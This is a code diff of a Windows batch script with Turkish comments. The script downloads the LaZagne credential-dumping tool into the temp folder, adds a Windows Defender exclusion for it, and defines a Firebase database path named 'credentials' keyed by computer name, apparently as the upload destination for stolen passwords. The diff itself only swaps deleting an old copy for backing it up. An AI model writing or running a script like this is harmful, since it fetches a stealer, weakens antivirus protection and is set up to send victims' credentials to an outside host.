@@ -10,6 +10,7 @@
 setlocal enabledelayedexpansion
 set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZ_EXE=%TEMP%\lazagne.exe"
+set "BACKUP_EXE=%TEMP%\lazagne_backup.exe"
 set "RESULT_DIR=%TEMP%\results"
 set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%"
 
@@ -17,19 +18,20 @@ echo ------------------------------------------------------------
 echo [INFO] Script basladi: %DATE% %TIME%
 echo ------------------------------------------------------------
 
-:: 2. Önce eski dosya varsa sil
+:: 2. Önce eski dosya varsa taşınarak yedekle
 if exist "%LAZ_EXE%" (
-    echo [INFO] Daha once indirilmis lazagne.exe bulundu. Siliniyor...
-    del /f /q "%LAZ_EXE%" || (
-        echo [ERROR] %LAZ_EXE% silinemedi!
+    echo [INFO] Daha once indirilmis lazagne.exe bulundu. Yedekleniyor...
+    move /Y "%LAZ_EXE%" "%BACKUP_EXE%" || (
+        echo [ERROR] %LAZ_EXE% tasinamadi!
         pause
         exit /b 1
     )
+    echo [OK] Mevcut dosya yedeklendi: %BACKUP_EXE%
 )
 
 :: 3. LaZagne.exe indiriliyor
 echo [INFO] Lazagne indiriliyor...
-powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing" 
+powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
 if %ERRORLEVEL% NEQ 0 (
     echo [ERROR] LaZagne.exe indirme basarisiz! HTTP veya network sorunu olabilir.
     pause
@@ -39,7 +41,7 @@ echo [OK] LaZagne.exe indirildi.
 
 :: 4. Defender exclusion ekle (defender aciksa)
 echo [INFO] Windows Defender exclusion ekleniyor...
-powershell -Command "Add-MpPreference -ExclusionProcess '%LAZ_EXE%'" 
+powershell -Command "Add-MpPreference -ExclusionProcess '%LAZ_EXE%'"
 if %ERRORLEVEL% NEQ 0 (
     echo [WARN] Defender exclusion eklenemedi (belki zaten ekli veya Defender kapali).
 ) else (
